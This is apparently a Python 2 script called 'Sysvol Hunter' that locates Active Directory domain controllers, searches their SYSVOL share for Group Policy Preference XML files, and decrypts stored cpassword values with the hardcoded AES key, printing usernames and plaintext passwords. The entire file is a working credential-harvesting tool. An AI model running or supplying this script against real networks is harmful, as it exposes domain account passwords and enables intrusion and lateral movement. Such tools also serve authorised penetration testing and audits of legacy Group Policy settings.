#!/usr/bin/env python
#title           : Sysvol Hunter
#description     : Automate finding and cracking sysvol passwords
#author          : Marouane El-ANBRI (Iron Geek)
#python_version  : 2.7.x
#Usage           : python sysvol_hunter.py
 
import os
import re
import socket
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from base64 import b64decode
 
def decrypter(cpassword):
    key = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b".decode('hex')
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    password = b64decode(cpassword)
    plain = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
    plain_fn = plain[:-ord(plain[-1])].decode('utf16')
    return plain_fn
 
print "[+] Detecting Domain Name... "
domain_name = socket.getfqdn().partition('.')[2]
os.system('nltest /dclist:%s > test.txt'%domain_name)
pattern=re.compile(r'([\w.]+\.[\w.]+\.[\w.]+)+')
dc=[]
ip_dc=[]
dc_file = open("test.txt", 'r')
for line in dc_file:
    dc += pattern.findall(line)
dc_file.close()
print "\n[+] Domain Name    : %s" %domain_name
print "[+] Finding Possible Domain Controllers..."
for i in dc:
    ip_dc.append(socket.gethostbyname(i))
os.remove("test.txt")
print"[+] Testing :%s" %dc[0]
path=[]
name=[]
sr_path = r'\\'+i+r'\sysvol'
for root, dirs, files in os.walk(sr_path):
    for file in files:
        if file.endswith('.xml'):
            path.append(os.path.join(root, file))
            name.append(os.path.basename(file))
        else:
            pass    
for f_name,f_dir in zip(name,path):
    with open(f_dir,"r") as sysvol_file:
        soup_vol = BeautifulSoup(sysvol_file, features="xml")
        prop_tag = soup_vol.Properties
        if prop_tag != None :
            print "\n[+] %s Contains Password" %f_name
            user_name= prop_tag.attrs['userName']
            cpass = prop_tag.attrs['cpassword']
            fn=decrypter(cpass)
            print "[+] User Name Found    : %s" %user_name
            print "[+] CPassword Found    : %s" %cpass
            print "[+] Password Decrypted : %s" %fn
        else:
            print "\n[-] %s File has No Password" %f_name
